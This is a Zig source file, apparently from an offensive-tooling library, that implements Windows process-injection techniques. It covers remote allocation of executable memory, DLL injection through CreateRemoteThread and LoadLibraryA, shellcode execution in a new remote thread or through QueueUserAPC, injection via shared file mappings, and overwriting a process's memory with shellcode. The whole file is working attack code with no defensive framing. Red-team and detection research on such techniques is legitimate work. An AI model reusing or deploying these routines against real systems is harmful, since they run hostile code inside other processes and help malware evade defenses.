const std = @import("std");
const win = @import("zigwin32").everything;
const writeToTargetProcess = @import("../process.zig").writeToTargetProcess;
const loadFunction = @import("../common.zig").loadFunction;

const HANDLE = win.HANDLE;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const INFINITE = win.INFINITE;
const INVALID_HANDLE_VALUE = win.INVALID_HANDLE_VALUE;
const PAGE_EXECUTE_READWRITE = win.PAGE_EXECUTE_READWRITE;

const VirtualAllocEx = win.VirtualAllocEx;
const VirtualFreeEx = win.VirtualFreeEx;
const VirtualProtectEx = win.VirtualProtectEx;
const GetLastError = win.GetLastError;
const CreateRemoteThread = win.CreateRemoteThread;
const CloseHandle = win.CloseHandle;
const WaitForSingleObject = win.WaitForSingleObject;
const GetModuleHandleA = win.GetModuleHandleA;
const GetProcAddress = win.GetProcAddress;
const QueueUserAPC = win.QueueUserAPC;
const CreateFileMappingA = win.CreateFileMappingA;
const MapViewOfFile = win.MapViewOfFile;
const MapViewOfFile2 = win.MapViewOfFileNuma2;
const FreeLibrary = win.FreeLibrary;

pub fn allocateMemory(comptime T: type, h_process: HANDLE, data: []const T) !*anyopaque {
    const data_size = (data.len + 1) * @sizeOf(T);

    const region = VirtualAllocEx(
        h_process,
        null,
        data_size,
        .{ .RESERVE = 1, .COMMIT = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };

    try writeToTargetProcess(
        h_process,
        region,
        @constCast(@ptrCast(data.ptr)),
        data_size,
    );

    return region;
}

pub fn allocateExecutableMemory(comptime T: type, h_process: HANDLE, data: []const T) !*anyopaque {
    const region = try allocateMemory(T, h_process, data);

    const data_size = (data.len + 1) * @sizeOf(T);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtectEx(
        h_process,
        region,
        data_size,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    return region;
}

pub fn freeVirtualMemory(h_process: HANDLE, region: *anyopaque) void {
    _ = VirtualFreeEx(h_process, region, 0, .RELEASE);
}

pub fn executeInNewThread(h_process: HANDLE, start_address: LPTHREAD_START_ROUTINE, parameter: ?*anyopaque) !void {
    const h_thread = CreateRemoteThread(
        h_process,
        null,
        0,
        start_address,
        parameter,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateRemoteThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateRemoteThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}

pub fn loadDllIntoProcess(h_process: HANDLE, dll_path: []const u8) !void {
    const load_library_a = try loadFunction(*anyopaque, "kernel32.dll", "LoadLibraryA");
    defer _ = FreeLibrary(load_library_a.h_module);

    const remote_dll_path_ptr = try allocateMemory(u8, h_process, dll_path);
    defer freeVirtualMemory(h_process, remote_dll_path_ptr);

    try executeInNewThread(h_process, @ptrCast(load_library_a.func), remote_dll_path_ptr);
}

pub fn injectShellCodeToProcess(h_process: HANDLE, shell_code: []const u8) !void {
    const shell_code_region = try allocateExecutableMemory(u8, h_process, shell_code);
    defer freeVirtualMemory(h_process, shell_code_region);

    try executeInNewThread(h_process, @ptrCast(shell_code_region), null);
}

pub fn injectShellCodeViaApc(h_process: HANDLE, h_thread: HANDLE, shell_code: []const u8) !void {
    const shell_code_region = try allocateExecutableMemory(u8, h_process, shell_code);

    if (QueueUserAPC(@ptrCast(shell_code_region), h_thread, 0) == 0) {
        std.debug.print("[!] QueueUserAPC Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.QueueUserAPCFailed;
    }
}

pub fn mapInject(h_process: HANDLE, shell_code: []const u8) !struct { map_local_address: *anyopaque, map_remote_address: *anyopaque } {
    const h_file = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        null,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        0,
        @intCast(shell_code.len),
        null,
    ) orelse {
        std.debug.print("[!] CreateFileMappingA Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateFileMappingAFailed;
    };
    defer _ = CloseHandle(h_file);

    const map_local_address = MapViewOfFile(
        h_file,
        .{ .READ = 1, .WRITE = 1 },
        0,
        0,
        @intCast(shell_code.len),
    ) orelse {
        std.debug.print("[!] MapViewOfFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.MapViewOfFilefailed;
    };
    @memcpy(@as([*]u8, @ptrCast(map_local_address)), shell_code);

    const map_remote_address = MapViewOfFile2(
        h_file,
        h_process,
        0,
        null,
        0,
        0,
        @bitCast(PAGE_EXECUTE_READWRITE),
        0,
    ) orelse {
        std.debug.print("[!] MapViewOfFile2 Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.MapViewOfFile2Failed;
    };

    return .{ .map_local_address = map_local_address, .map_remote_address = map_remote_address };
}

pub fn injectShellCode(h_process: HANDLE, address: *anyopaque, shell_code: []const u8) !void {
    var old_protection: PAGE_PROTECTION_FLAGS = undefined;

    if (VirtualProtectEx(
        h_process,
        address,
        shell_code.len,
        .{ .PAGE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    try writeToTargetProcess(
        h_process,
        address,
        @ptrCast(shell_code.ptr),
        shell_code.len,
    );

    if (VirtualProtectEx(
        h_process,
        address,
        shell_code.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }
}
